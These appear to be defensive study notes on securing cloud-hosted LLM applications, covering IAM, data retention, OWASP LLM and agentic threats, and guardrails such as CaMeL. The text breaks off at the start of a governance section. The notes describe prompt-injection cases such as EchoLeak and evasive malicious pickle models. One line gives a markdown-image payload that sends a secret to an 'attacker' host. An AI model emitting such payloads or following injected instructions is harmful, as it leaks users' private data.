## 1. Cloud security foundations applied to AI (shared responsibility, IAM/workload identity, secrets, KMS, network isolation/private endpoints, VPC-SC, audit logging)

### Takeaway
Managed LLM services (Bedrock, Vertex AI / "Gemini Enterprise Agent Platform", Azure OpenAI / Foundry) use the same controls as any cloud API. Use keyless workload identity (OIDC federation), customer-managed KMS keys, private endpoints, and data-exfiltration perimeters. Turn on audit and invocation logging. These controls protect the *pipe* and the *principal*, but they do not decide whether a given authenticated caller should be allowed to send a given prompt. That layer belongs to the application and the guardrails.

### Cited Findings
**Workload identity (keyless auth from Kubernetes to cloud AI APIs)**
- EKS, GKE and AKS all work the same way. The Kubernetes cluster acts as an OIDC identity provider that publishes a discovery endpoint and signing keys. The pod presents a short-lived projected service-account token to the cloud STS and exchanges it for cloud credentials. — [jorijn.com workload identity guide](https://jorijn.com/en/knowledge-base/kubernetes/security/workload-identity-irsa-eks-gke-aks/)
- **EKS Pod Identity vs IRSA.** Pod Identity is an EKS add-on and needs **no OIDC provider**. IRSA does need one. AWS docs recommend EKS Pod Identity "whenever possible". IRSA is still a fit where OIDC/IRSA is already set up or on platforms that Pod Identity does not support. — [Hidekazu Konishi decision guide](https://hidekazu-konishi.com/entry/amazon_eks_pod_identity_and_irsa_decision_guide.html); [Rafay: Pod Identity vs IRSA](https://docs.rafay.co/blog/2024/10/03/pod-identity-versus-irsa-for-amazon-eks---part-1/)
- IRSA's operational pain point: each EKS cluster has its own OIDC provider, so IAM trust policies have to be edited whenever clusters are recreated, for example during blue-green upgrades. — [Domino blueprint](https://domino.ai/resources/blueprints/advanced-credential-propagation-aws-eks)
- AKS Workload Identity uses federated identity credentials that trust the cluster's OIDC issuer. The subject must be `system:serviceaccount:<namespace>:<service-account-name>`, and the audience is the Azure token-exchange value. — [jorijn.com](https://jorijn.com/en/knowledge-base/kubernetes/security/workload-identity-irsa-eks-gke-aks/)
- [OLDER] IRSA (2019) was the original EKS approach. Pod Identity is now the preferred default (see above).

**Encryption, private connectivity, data perimeter (Bedrock)**
- AWS lists these Bedrock protections: encryption in transit and at rest, AWS KMS (customer-managed keys), and private VPC connectivity via **AWS PrivateLink**. — [AWS Bedrock security, privacy & responsible AI](https://aws.amazon.com/bedrock/security-privacy-responsible-ai)
- Pattern: applications reach Bedrock through **interface VPC endpoints**, so traffic stays on the AWS network and never crosses the public internet. — [InterWorks: Securing Amazon Bedrock (Mar 2026)](https://interworks.com/blog/2026/03/06/securing-amazon-bedrock-what-enterprises-need-to-get-right/)
- Critique: Guardrails, PrivateLink and IAM each do a different job. None of them checks whether a specific authenticated caller should be allowed to send a given prompt (the "request gap"). — [DeepInspect: AWS Bedrock security](https://www.deepinspect.ai/blog/aws-bedrock-security). The same vendor makes the same argument for Vertex AI ("five native controls and the request gap"). — [DeepInspect: Vertex AI security](https://www.deepinspect.ai/blog/vertex-ai-security) *(vendor source with a product interest)*

**Background controls [BK], canonical sources not re-fetched this session**
- **Shared responsibility for AI** [BK]. The provider secures the infrastructure, model hosting and service plane. The customer owns IAM, network configuration, data classification, prompt and response handling, guardrail configuration, logging configuration and application-layer security (the AI Shared Responsibility Model). — [Microsoft: AI shared responsibility model](https://learn.microsoft.com/en-us/azure/security/fundamentals/shared-responsibility-ai); [AWS Shared Responsibility Model](https://aws.amazon.com/compliance/shared-responsibility-model/)
- **Least-privilege IAM** [BK]. On AWS, scope `bedrock:InvokeModel` / `InvokeModelWithResponseStream` to specific model ARNs or inference profiles, and use SCPs to deny unapproved models and Regions. On Azure, use Entra ID RBAC roles such as "Cognitive Services OpenAI User" with managed identity, and set `disableLocalAuth=true` to switch off API keys. On GCP, grant `roles/aiplatform.user` to a dedicated service account through Workload Identity Federation for GKE. — [Bedrock IAM](https://docs.aws.amazon.com/bedrock/latest/userguide/security-iam.html); [Azure OpenAI managed identity](https://learn.microsoft.com/en-us/azure/ai-services/openai/how-to/managed-identity); [GKE Workload Identity Federation](https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity)
- [OLDER][BK] "GKE Workload Identity" was renamed "Workload Identity Federation for GKE" in 2024. — [GKE docs](https://cloud.google.com/kubernetes-engine/docs/concepts/workload-identity)
- **Secrets** [BK]. Store third-party LLM API keys (OpenAI, Anthropic, etc.) and vector-DB credentials in AWS Secrets Manager, GCP Secret Manager, Azure Key Vault or HashiCorp Vault. Do not put them in env files or prompts. Rotate them, and prefer keyless identity wherever the provider supports it. — [AWS Secrets Manager](https://docs.aws.amazon.com/secretsmanager/latest/userguide/intro.html); [Azure Key Vault](https://learn.microsoft.com/en-us/azure/key-vault/general/overview); [HashiCorp Vault](https://developer.hashicorp.com/vault/docs)
- **Private endpoints and perimeters** [BK]. GCP: Vertex AI supports **Private Service Connect** endpoints, and **VPC Service Controls** perimeters around `aiplatform.googleapis.com` reduce exfiltration risk. Azure: Azure OpenAI / Foundry supports **Private Link** private endpoints and "public network access: disabled". AWS: Bedrock VPC endpoints accept endpoint policies. — [Vertex AI VPC-SC](https://cloud.google.com/vertex-ai/docs/general/vpc-service-controls); [Azure AI services private endpoints](https://learn.microsoft.com/en-us/azure/ai-services/cognitive-services-virtual-networks); [Bedrock VPC endpoints](https://docs.aws.amazon.com/bedrock/latest/userguide/vpc-interface-endpoints.html)
- **Audit logging** [BK]. CloudTrail records Bedrock API calls (management and control-plane activity). Prompt and response capture is a separate feature, **Bedrock model invocation logging**, which is **off by default** and writes to CloudWatch Logs or S3. GCP uses Cloud Audit Logs, where Data Access logs must be enabled. Azure uses Diagnostic settings and Azure Monitor. Treat invocation logs as sensitive data: encrypt them and restrict access. — [Bedrock model invocation logging](https://docs.aws.amazon.com/bedrock/latest/userguide/model-invocation-logging.html); [Bedrock CloudTrail](https://docs.aws.amazon.com/bedrock/latest/userguide/logging-using-cloudtrail.html)

### Inferences
- The study-grade summary is **identity → network → encryption → logging → application authorization**. The first four come from the cloud provider. The fifth (per-user and per-tool authorization, plus prompt policy) has to be built by the engineer, and it is where most LLM-specific incidents happen.
- Logging is a two-sided risk. Without invocation logs you have no audit trail (relevant to EU AI Act record-keeping, Q5). With them, you hold a new store of PII and secrets that may conflict with zero-data-retention goals (Q2).

## 2. Data protection for AI (residency, provider data-use, zero data retention, PII redaction, confidential computing)

### Takeaway
All three hyperscalers contractually commit not to train foundation models on customer API data. "Zero data retention" is still not the default anywhere. Azure requires an approved **modified abuse monitoring** exemption. Vertex requires disabling its **24-hour in-memory cache** and getting an abuse-monitoring exception. Stateful features (Responses API, files, fine-tuning, grounding, session resumption) bring their own retention. GPU confidential computing (H100, and Blackwell starting to appear) is generally available for single-GPU inference on Azure and GCP. It has documented limits, and multi-GPU support is immature.

### Cited Findings
**Provider data-use / training**
- **Bedrock**: customer inputs and outputs are not shared with model providers and are not used to train base models. Fine-tuning produces a private copy of the model for the customer. — [AWS Bedrock security/privacy page](https://aws.amazon.com/bedrock/security-privacy-responsible-ai); [Bedrock FAQs](https://aws.amazon.com/bedrock/faqs/)
- **Azure OpenAI / Foundry (Microsoft-hosted models)**: for standard stateless inference, prompts and completions are not stored in the model. Standard deployments do include **abuse monitoring**. Prompts or completions flagged as potentially abusive can be stored in a logically separated store and reviewed. — [Microsoft Q&A: ZDR and Azure OpenAI](https://learn.microsoft.com/en-in/answers/questions/6031402/zero-data-retention-security-and-data-privacy-in-a); [Microsoft Foundry content filtering docs](https://learn.microsoft.com/en-us/azure/foundry-classic/foundry-models/concepts/content-filter)
- **Azure retention period is disputed.** One source cites a 30-day abuse-monitoring retention window. A Microsoft Q&A thread says the "up to thirty days" wording was **removed around the 18 Nov 2024 update** that introduced AI-based review, and that current docs give no duration. — [Meetily: Azure ZDR summary](https://meetily.ai/llm-privacy/azure); contradicted by [Microsoft Q&A thread](https://learn.microsoft.com/en-au/answers/questions/5609842/urgent-clarification-on-disabling-abuse-monitoring)
- **How to get Azure ZDR**: apply for **Modified Abuse Monitoring**. It goes through approval and is not self-serve, and it typically requires a managed EA/MCA customer. Once approved, the resource shows `ContentLogging=false`. Real-time automated safety classification still runs. ZDR covers abuse-monitoring storage **only**. The Responses API, stored completions, file uploads and fine-tuning keep their own retention. — [Microsoft Q&A: Modified Abuse Monitoring on Foundry](https://learn.microsoft.com/en-au/answers/questions/5954113/modified-abuse-monitoring-on-azure-foundry); [Microsoft Q&A: ZDR agreement](https://learn.microsoft.com/en-us/answers/questions/5738671/how-can-i-get-a-zero-data-retention-agreement-so-i); [Meetily](https://meetily.ai/llm-privacy/azure)
- Open question raised on Microsoft Q&A in 2026: whether default abuse monitoring is covered by the HIPAA BAA. — [Microsoft Q&A](https://learn.microsoft.com/en-us/answers/questions/5941618/is-default-abuse-monitoring-for-azure-openai-found) *(question title only; answer not retrieved)*
- **Vertex AI / Gemini**: by default, Gemini models on Vertex cache inputs and outputs **in memory for up to 24 hours at project level**. Admins can disable the cache through the API to reach ZDR. The setting is per project and applies across all regions. Google may log prompts for abuse detection under the GCP Terms of Service, and customers can request an **abuse-monitoring exception**. Some advanced features may make ZDR impossible. Live API **session resumption** stores data for up to 24 h. Request-response logging is off by default. **Grounding with Google Search** keeps logs for up to **3 days** according to Google's page; a third-party summary cites 30 days for the Gemini *Developer* API. — [Google Cloud: zero data retention](https://docs.cloud.google.com/vertex-ai/generative-ai/docs/vertex-ai-zero-data-retention); [Meetily: Gemini ZDR](https://meetily.ai/llm-privacy/gemini)
- Google's documentation now calls Vertex AI the **"Gemini Enterprise Agent Platform"**. — [Google Cloud ZDR page title](https://docs.cloud.google.com/vertex-ai/generative-ai/docs/vertex-ai-zero-data-retention)
- An academic review of ZDR in enterprise LLM assistants (arXiv 2510.11558) exists. — [arXiv 2510.11558](https://arxiv.org/pdf/2510.11558) *(content not retrieved)*

**Confidential computing for AI**
- **Azure NCC H100 v5**: confidential VMs that pair AMD SEV-SNP CPUs with H100 GPUs in confidential mode and encrypt the CPU–GPU link. Reported GA in East US 2 and West Europe, aimed at inference and fine-tuning of small-to-medium models. — [Azure blog: future of GPUs is confidential](https://azure.microsoft.com/en-us/blog/how-azure-is-ensuring-the-future-of-gpus-is-confidential/); [Azure/az-cgpu-onboarding (GitHub)](https://github.com/Azure/az-cgpu-onboarding)
- **GCP**: one source says the single-GPU **A3 confidential VM (H100)** went GA in July 2025. Competitor guides from 2026 call it "limited availability" or "limited preview" (**conflict**). Google's own blog covers **G4 (RTX PRO 6000 Blackwell)** confidential VMs and GKE nodes, and says **Confidential Space with Hopper GPUs** is GA. — [Google Cloud blog: what's new in Confidential Computing](https://cloud.google.com/blog/products/identity-security/verifiable-trust-in-the-ai-era-whats-new-in-confidential-computing); conflicting status in [VoltageGPU comparison](https://voltagegpu.com/compare/confidential-gpu-clouds) and [Spheron guide](https://www.spheron.network/blog/confidential-gpu-computing-nvidia-tee-encrypted-vram/)
- **Limits of H100 CC**: a 2025 academic analysis found weaknesses, including limited protection against physical attacks. **Multi-GPU CC was disabled** when it was written, and Hopper CC does not support large-scale training. — [arXiv 2507.02770: NVIDIA GPU Confidential Computing Demystified](https://arxiv.org/html/2507.02770v1)
- **Blackwell**: expected to add GPU-to-GPU (NVLink) encryption and Trusted I/O, but I found no source confirming broad cloud availability. The confirmed Blackwell CC options are GCP G4 and, according to one vendor, B200/B300 in reserved CC-mode deployments. — [Rubinlake tech radar](https://rubinlake.com/en/technology-radar/ai-security-and-governance/confidential-computing-ai); [Phala explainer](https://phala.com/learn/How-Nvidia-Enable-Confidential-AI); [Spheron](https://www.spheron.network/blog/confidential-gpu-computing-nvidia-tee-encrypted-vram/)

**PII detection / redaction [BK], not verified this session (search budget exhausted)**
- **Amazon Comprehend** `DetectPiiEntities` / `ContainsPiiEntities` find and redact PII in text. **Bedrock Guardrails' sensitive-information filter** can BLOCK or MASK PII entity types and custom regexes on input and output (see also Q4). — [Comprehend PII docs](https://docs.aws.amazon.com/comprehend/latest/dg/how-pii.html); [Bedrock Guardrails sensitive information filters](https://docs.aws.amazon.com/bedrock/latest/userguide/guardrails-sensitive-filters.html)
- **Google Sensitive Data Protection** (formerly Cloud DLP) offers infoType detection and de-identification by masking, tokenization, format-preserving encryption and date-shifting. Use it to scrub RAG corpora and prompts before they reach Gemini. — [Sensitive Data Protection docs](https://cloud.google.com/sensitive-data-protection/docs)
- **Microsoft Presidio** is an open-source Analyzer + Anonymizer (NER + regex + checksum recognizers, with reversible pseudonymization) and is commonly used as a pre- and post-LLM filter. — [Presidio](https://microsoft.github.io/presidio/)

### Inferences
- In 2026, "no training on API data" is table stakes and settled. The open engineering questions are **retention** (abuse-monitoring stores, caches, logs and stateful APIs) and **residency** (global vs regional vs data-zone endpoints, plus cross-region inference profiles that can route traffic out of a geography). Each feature needs its own check.
- Confidential computing protects data *in use* from the cloud operator. It does nothing against prompt injection or application-level leakage, so it complements the Q3/Q4 controls and does not replace them.

## 3. LLM application threats (OWASP LLM Top 10 2025, OWASP Agentic Top 10, prompt injection, exfiltration, excessive agency, poisoning, supply chain, denial of wallet)

### Takeaway
The canonical taxonomies are the **OWASP Top 10 for LLM Applications 2025** (released late 2024) and the **OWASP Top 10 for Agentic Applications 2026** (ASI01–ASI10, released December 2025). Prompt injection is still #1 and still unsolved. The agentic list reframes it as **Agent Goal Hijack**. Willison's **"lethal trifecta"** and Meta's **"Agents Rule of Two"** are the most useful mental models for when injection turns into data theft or harmful actions.

### Cited Findings
**OWASP Top 10 for LLM Applications 2025** (all ten)
1. **LLM01 Prompt Injection**: crafted inputs (direct, or indirect via retrieved/third-party content) change model behaviour.
2. **LLM02 Sensitive Information Disclosure**
3. **LLM03 Supply Chain**
4. **LLM04 Data and Model Poisoning**
5. **LLM05 Improper Output Handling**: downstream systems trust model output without validating or encoding it. Formerly "Insecure Output Handling".
6. **LLM06 Excessive Agency**: more functionality, permissions or autonomy than the task needs.
7. **LLM07 System Prompt Leakage** (new in 2025)
8. **LLM08 Vector and Embedding Weaknesses** (new in 2025; RAG-specific)
9. **LLM09 Misinformation**
10. **LLM10 Unbounded Consumption**: replaces 2023's "Model Denial of Service" and covers cost and resource exhaustion, i.e. **denial of wallet**, plus model extraction through high-volume querying.
— [Invicti: OWASP LLM Top 10 2025](https://www.invicti.com/blog/web-security/owasp-top-10-risks-llm-security-2025); [Gravitee practical guide](https://www.gravitee.io/blog/owasp-top-10-for-llm-applications-2025-a-practical-guide); [HCL AppScan reference](https://help.hcl-software.com/appscan/Enterprise/10.10.0/topics/r_owasp_top_10_for_llm.html); [Modulos](https://docs.modulos.ai/frameworks/owasp-top-10-llm)
- Publication date: one source gives **18 Nov 2024**, which I did not verify on OWASP's own site. — [search extract via Modulos/Indusface](https://www.indusface.com/learning/owasp-top-10-llm/)
- [OLDER] The 2023 v1.1 list had Insecure Output Handling at #2 and Model DoS at #4. It also included Insecure Plugin Design, Overreliance and Model Theft, which were folded into other entries in 2025. — [Invicti](https://www.invicti.com/blog/web-security/owasp-top-10-risks-llm-security-2025)

**OWASP Top 10 for Agentic Applications 2026** (published **9 Dec 2025** by the OWASP GenAI Security Project; extends the LLM Top 10 and does not replace it)
- **ASI01 Agent Goal Hijack**: attacker redirects the agent's objectives, task selection or decision path, often via indirect prompt injection in content the agent consumes. Example: **EchoLeak**, where a hidden instruction in an email made Microsoft 365 Copilot exfiltrate data with zero clicks. Another example: a calendar invite that shifts agent priorities.
- **ASI02 Tool Misuse & Exploitation**: legitimate tools used unsafely, e.g. chaining a benign tool into a sensitive API.
- **ASI03 Identity & Privilege Abuse**: agents inherit user or system credentials, which then get reused, escalated or passed between agents.
- **ASI04 Agentic Supply Chain Vulnerabilities**: tools, MCP servers, plugins, models and prompts sourced from third parties.
- **ASI05 Unexpected Code Execution**
- **ASI06 Memory & Context Poisoning**: persistent corruption of memory, embeddings or shared context that shapes later decisions.
- **ASI07 Insecure Inter-Agent Communication**
- **ASI08 Cascading Failures**: one fault spreads across agents and workflows.
- **ASI09 Human-Agent Trust Exploitation**
- **ASI10 Rogue Agents**: behavioural drift, collusion, self-replication.
— [Cycode](https://cycode.com/blog/owasp-top-10-agentic-applications/); [Giskard (18 Dec 2025)](https://www.giskard.ai/knowledge/owasp-top-10-for-agentic-application-2026); [Teleport](https://goteleport.com/blog/owasp-top-10-agentic-applications/); [Aikido](https://www.aikido.dev/blog/owasp-top-10-agentic-applications); [Auth0 lessons](https://auth0.com/blog/owasp-top-10-agentic-applications-lessons/). *Secondary sources word some short names differently (e.g., "Tool Misuse" vs "Tool Misuse & Exploitation"). Official OWASP PDF not retrieved.*
- [OLDER] The OWASP GenAI project's earlier "Agentic AI – Threats and Mitigations" guide (Feb 2025) came before the ASI Top 10. [BK] — [OWASP GenAI](https://genai.owasp.org/)

**Prompt injection, exfiltration and agency models**
- **Lethal trifecta** (Simon Willison, **16 Jun 2025**): an agent that has (1) access to private data, (2) exposure to untrusted content and (3) a way to communicate externally can be tricked into stealing that data. — [Simon Willison: The lethal trifecta](https://simonwillison.net/2025/jun/16/the-lethal-trifecta/)
- **Agents Rule of Two** (Meta, **31 Oct 2025**), inspired by the lethal trifecta and Chrome's Rule of 2. Until injection can be reliably detected, an agent should have at most two of: [A] processes untrustworthy inputs, [B] accesses sensitive systems or private data, [C] changes state or communicates externally. An agent that needs all three should not run autonomously and needs supervision such as human-in-the-loop approval. The Rule of Two goes further than the trifecta: it covers **state-changing** actions, not just exfiltration. — [Simon Willison on new prompt-injection papers (2 Nov 2025)](https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/); [DeepStation summary](https://deepstation.ai/blog/metas-agents-rule-of-two-secure-ai-agent-framework)
- These framings reduce blast radius. They are heuristics and do not guarantee a complete defence. — [Governed Agent substack](https://governedagent.substack.com/p/name-the-monster-the-lethal-trifecta)
- OWASP researchers still describe prompt injection as **unsolved** (Infosecurity Europe coverage). — [Infosecurity Magazine](https://www.infosecurity-magazine.com/news/infosec-europe-prompt-injection/) *(headline-level)*
- **Markdown-image / link exfiltration** [BK]. Injected instructions make the model output `![](https://attacker/?q=<secret>)`. The client auto-renders the image and sends the data out in the URL without any user action. This is the "external communication" leg of the trifecta, and "rendering links or images" falls under that property. Willison has catalogued many such bugs in ChatGPT, Bard/Gemini, Copilot, Slack AI and others. — [Simon Willison: markdown-exfiltration tag](https://simonwillison.net/tags/markdown-exfiltration/)

**Model/data poisoning and supply chain**
- **Malicious pickles ("nullifAI", Feb 2025)**: ReversingLabs found pickle-based models on Hugging Face that used broken or **7z-compressed** pickle files. The outer `torch.load()` wrapper failed, so **Picklescan** errored out without reading the payload, yet the payload still ran on load. Sources disagree on scale: one says Hugging Face removed the models within 24 h and updated the tool, another calls them closer to proof-of-concept. — [The Hacker News (Feb 2025)](https://thehackernews.com/2025/02/malicious-ml-models-found-on-hugging.html)
- **safetensors** is the structural fix. It stores only tensor data, and the loader has no executable code path by design. Blacklist scanners over an executable format (pickle) will always leave a gap. — [SecureTom: vetting Hugging Face downloads](https://securetom.com/blog/open-source-ai-model-security-hugging-face); [Madgett Law: "Executable code you are calling a model"](https://www.madgettlaw.com/practice-lab/executable-code-you-are-calling-a-model/)
- Academic follow-up: **PickleBall** (secure deserialization of pickle-based models). — [arXiv 2508.15987](https://arxiv.org/pdf/2508.15987)
- **Model signing**: **OpenSSF Model Signing v1.0** shipped **4 Apr 2025** as a library and CLI for signing and verifying models of any format and size. It supports Sigstore (keyless), self-signed certificates or key pairs, and all three produce a **Sigstore bundle**. Built on sigstore-python with NVIDIA and HiddenLayer, and designed to plug into hubs such as Kaggle and Hugging Face. The **OMS (OpenSSF Model Signing) spec** was introduced in June 2025. Signing proves integrity and provenance **after** publication. It does **not** show that a model is benign. — [OpenSSF: Model Signing v1.0](https://openssf.org/blog/2025/04/04/launch-of-model-signing-v1-0-openssf-ai-ml-working-group-secures-the-machine-learning-supply-chain/); [Sigstore blog](https://blog.sigstore.dev/model-transparency-v1.0/); [OpenSSF: OMS spec intro](https://openssf.org/blog/2025/06/25/an-introduction-to-the-openssf-model-signing-oms-specification/)
- The agentic supply chain now covers **MCP servers and tool registries** as well as models and packages. MITRE ATLAS added "Publish Poisoned AI Agent Tool" (see Q4). — [Slash Digital: AI supply chain (models, packages, MCP)](https://slash-digital.io/en/insights/ai-supply-chain-security/); [Vectra on ATLAS](https://www.vectra.ai/topics/mitre-atlas)

### Inferences
- For an AI engineer, the useful split is **model-level** threats (jailbreaks, poisoning, extraction) versus **system-level** threats (indirect injection plus tools plus egress = exfiltration or unauthorized actions). Most real 2025–26 incidents (EchoLeak and the markdown-image bugs) are system-level and come from architecture, not the model.
- Denial of wallet (LLM10) is a cloud-billing problem as much as a security one. Rate limits, max-token caps, per-tenant quotas and budget alarms belong in the threat model.

## 4. Defenses (guardrails, least-privilege tools, HITL, sandboxing, output encoding, allowlists, dual-LLM/CaMeL, red teaming, MITRE ATLAS)

### Takeaway
Guardrail classifiers (Bedrock Guardrails, Azure Prompt Shields, Llama Guard, NeMo) are probabilistic filters, useful but bypassable. The defences that hold up are **architectural**: least-privilege tools, capability/data-flow control (CaMeL), the Rule of Two, egress allowlists, output encoding, sandboxed code execution and human approval for high-impact actions. Back these with continuous red teaming (garak, PyRIT) mapped to MITRE ATLAS, which grew fast in 2026 with agent-specific techniques.

### Cited Findings
**Managed guardrails**
- **Amazon Bedrock Guardrails**: content filters (hate, insults, sexual, violence, misconduct, **prompt attack**), denied topics, word filters, **PII / sensitive-information filters**, and **contextual grounding checks** (hallucination detection for RAG). Guardrails run inline on model invocation or standalone through the **ApplyGuardrail** API, so they work with non-Bedrock models too. The FAQ also describes an **InvokeGuardrailChecks** API that runs content filters, prompt-attack detection and sensitive-info filters as standalone, *resource-less* checks for agentic apps. — [Bedrock Guardrails components](https://docs.aws.amazon.com/bedrock/latest/userguide/guardrails-components.html); [Bedrock FAQs](https://aws.amazon.com/bedrock/faqs/); [InterWorks](https://interworks.com/blog/2026/03/06/securing-amazon-bedrock-what-enterprises-need-to-get-right/)
- **Automated Reasoning checks** (formal-logic verification of outputs against a policy) were previewed **Dec 2024** [OLDER] and went **GA Aug 2025** in us-east-1/2, us-west-2, eu-central-1, eu-west-1 and eu-west-3. AWS's "up to 99% verification accuracy" and "blocks up to 88% harmful content" are vendor marketing claims. — [AWS What's New: AR checks preview (Dec 2024)](https://aws.amazon.com/about-aws/whats-new/2024/12/amazon-bedrock-guardrails-automated-reasoning-checks-preview); [AWS What's New: AR checks GA (Aug 2025)](https://aws.amazon.com/about-aws/whats-new/2025/08/automated-reasoning-checks-amazon-bedrock-guardrails)
- **Azure AI Content Safety / Prompt Shields** detects **direct** attacks (user jailbreaks) and **indirect** attacks (instructions hidden in grounded documents). Indirect-attack detection **requires document delimiters** when the prompt is built (spotlighting). Content Safety is now presented under the "Foundry Control Plane". — [Microsoft Foundry content filtering](https://learn.microsoft.com/en-us/azure/foundry-classic/foundry-models/concepts/content-filter); [Azure AI Content Safety product page](https://azure.microsoft.com/en-us/products/ai-services/ai-content-safety/)

**Open-source guardrails and red-team tools**
- **Llama Guard 4**: a 12B **natively multimodal** safe/unsafe classifier pruned from Llama 4 Scout, for inputs and outputs. [OLDER] Llama Guard 3 was based on Llama-3.1-8B. — [TraeAI red-team tooling notes](https://learn.traeai.com/t/ai-engineering/phases/18-ethics-safety-alignment/16-red-team-tooling-garak-llamaguard-pyrit); [PremAI guardrails comparison](https://blog.premai.io/production-llm-guardrails-nemo-guardrails-ai-llama-guard-compared)
- **NVIDIA NeMo Guardrails**: a runtime orchestration layer with **Colang** for multi-turn dialogue flow control. It can call Llama Guard or other classifiers as input and output rails, so it complements them rather than competing. — [PremAI](https://blog.premai.io/production-llm-guardrails-nemo-guardrails-ai-llama-guard-compared); [VIPS comparison](https://learn.engineering.vips.edu/compare/nvidia-nemo-guardrails-vs-llm-guard)
- **garak** (NVIDIA): an open-source (Apache-2.0) LLM vulnerability scanner with static, dynamic and adaptive probes for hallucination, data leakage, prompt injection, toxicity and jailbreaks. **PyRIT** (Microsoft): a red-team *campaign orchestrator* for multi-turn attacks (Crescendo, TAP, custom converter chains). Common pattern: garak/PyRIT to **test**, Llama Guard/NeMo to **protect** at runtime. — [TraeAI](https://learn.traeai.com/t/ai-engineering/phases/18-ethics-safety-alignment/16-red-team-tooling-garak-llamaguard-pyrit); [CoderCops guardrail frameworks 2026](https://blog.codercops.com/blog/llm-guardrails-frameworks-comparison-2026)

**Architectural defences: CaMeL and dual-LLM**
- **CaMeL** ("Defeating Prompt Injections by Design", Debenedetti et al., Google/Google DeepMind/ETH, arXiv **2503.18813**, Mar 2025; published at **SaTML 2026**). A **Privileged LLM** writes a plan (code) from the *trusted* user query only. A **Quarantined LLM** parses untrusted data and has **no tool access**. A custom interpreter tracks **data provenance (capabilities)** and enforces security policies before every tool call, so untrusted data can never change control flow and cannot reach a disallowed sink. This extends Willison's 2023 **Dual-LLM pattern**. — [arXiv 2503.18813 (v2 HTML)](https://arxiv.org/html/2503.18813v2); [SaTML 2026 proceedings](https://www.computer.org/csdl/proceedings-article/satml/2026/785900a587/2jZks3ksGT6); [HF paper page](https://huggingface.co/papers/2503.18813)
- **CaMeL results on AgentDojo**: the arXiv abstract reports **67%** of tasks solved with provable security. The SaTML 2026 version reports **77%** with guarantees vs **84%** undefended (o3-high: 77.3% vs 84.5%). For Claude 3.5 Sonnet, successful attacks were **0** with CaMeL vs **8** for the next-best defence (tool filter) vs **44** undefended. The weak spot is the Travel suite (Claude 3.5 Sonnet 25% with CaMeL vs 75% native). The authors say it does not cover every attack vector. — [arXiv 2503.18813](https://arxiv.org/pdf/2503.18813); [SaTML 2026](https://www.computer.org/csdl/proceedings-article/satml/2026/785900a587/2jZks3ksGT6); [Liner review](https://liner.com/review/defeating-prompt-injections-by-design) *(the 67% vs 77% gap is a version difference, not a contradiction)*
- **Rule of Two / HITL**: if an agent needs untrusted input, sensitive data and external action all together, require human-in-the-loop approval. — [Simon Willison (Nov 2025)](https://simonwillison.net/2025/Nov/2/new-prompt-injection-papers/)
- "You cannot filter your way out of prompt injection": filter-based defences are bypassable, which argues for architectural controls. — [HackerNoon](https://hackernoon.com/you-cannot-filter-your-way-out-of-prompt-injection) *(opinion piece)*
- **Classic controls [BK]**: treat LLM output as untrusted user input (LLM05). Use context-aware output encoding (HTML/JS/SQL/shell), parameterized queries, and no `eval`. Run model-generated code in sandboxes (gVisor/Firecracker microVMs, no network, ephemeral). Apply egress and URL **allowlists** and a CSP on chat UIs to block markdown-image exfiltration. Use **per-tool least-privilege** credentials scoped to the end user (on-behalf-of / OAuth token exchange) rather than one broad service identity. Set max-token, rate and budget limits against LLM10. — [OWASP LLM Top 10 project](https://genai.owasp.org/llm-top-10/)

**MITRE ATLAS (adversarial threat matrix for AI)**
- Growth through 2026 (secondary sources; **counts conflict by release**): **Oct 2025**: 15 tactics / 66 techniques. **Feb 2026 (v5.4.0)**: 16 tactics / 84 techniques / 56 sub-techniques, adding agent techniques such as "Publish Poisoned AI Agent Tool" and "Escape to Host". **v2026.08 (1 Sep 2026)**: 16 tactics / 114 techniques / 83 sub-techniques / 39 mitigations / 72 case studies. **v2026.09**: 120 techniques / 88 sub-techniques / 40 mitigations / 73 case studies, with autonomous-agent techniques **AML.T0116–AML.T0124** and agent-authority mitigations **AML.M0037, AML.M0038**. — [Vectra: ATLAS 16 tactics/84 techniques](https://www.vectra.ai/topics/mitre-atlas); [CallSphere: ATLAS 2026 update](https://callsphere.ai/blog/td30-rp-mitre-atlas-2026-update); [Speakeasy: ATLAS is now an agent security framework](https://www.speakeasy.com/blog/mitre-atlas-explained); outlier counts (e.g., "167 techniques", "v2026.07") at [Aurora SRE](https://www.aurorasre.ai/blog/mitre-atlas-autonomous-ai-agent-attacks) are unreliable.
- Zenity is credited with contributing **14 agentic AI attack techniques** to ATLAS in 2026. — [Paperclipped](https://www.paperclipped.de/en/blog/mitre-atlas-agentic-ai-threat-framework/) *(headline-level)*
- The versioning scheme seems to have changed from semantic (v5.x) to date-based (v2026.MM) during 2026. I inferred this from the source naming and did not confirm it with MITRE.

### Inferences
- Defence-in-depth for an LLM app, in order of reliability: (1) **architecture** (CaMeL-style plan/data separation, Rule of Two, no auto-rendered external URLs), (2) **least privilege** (per-user OBO tokens, scoped tools, read-only by default), (3) **containment** (sandbox, egress allowlist, budgets), (4) **detection** (Prompt Shields / Bedrock prompt-attack filter / Llama Guard), (5) **assurance** (garak/PyRIT in CI, ATLAS-mapped threat model, logging).
- CaMeL's roughly 7-point utility cost (77 vs 84) is the current price of *provable* injection resistance. Expect production systems to use CaMeL-like data-flow policies only for high-risk tool paths.

## 5. Governance & compliance (EU AI Act incl. digital omnibus, NIST AI RMF + GenAI profile, ISO/IEC 42001, SOC 2, HIPAA/BAAs, GDPR; model cards, inventories, audit trails)

### Takeaway
**The EU AI Act timeline changed in 2026.** The **Digital Omnibus on AI** (Reg. (EU) **2026/1744**, in force **27 Jul 2026** per secondary sources) moved stand-alone **Annex III high-risk** obligations from 2 Aug 2026 to **2 Dec 2027**, and **Annex I** (product-embedded) obligations to **2 Aug 2028**. **GPAI obligations have applied since 2 Aug 2025**, with Commission **enforcement and fining powers live from 2 Aug 2026**. **Article 50 transparency** applies from 2 Aug 2026, with a short watermarking grace period to 2 Dec 2026. In the US, NIST's AI RMF + GenAI Profile (AI 600-1) is still the baseline, with a CSF-based **Cyber AI Profile (IR 8596)** in draft. HIPAA use of LLMs depends on **BAA scope per feature**, not on any "HIPAA-compliant model".

**EU AI Act: baseline (Reg. (EU) 2024/1689)**
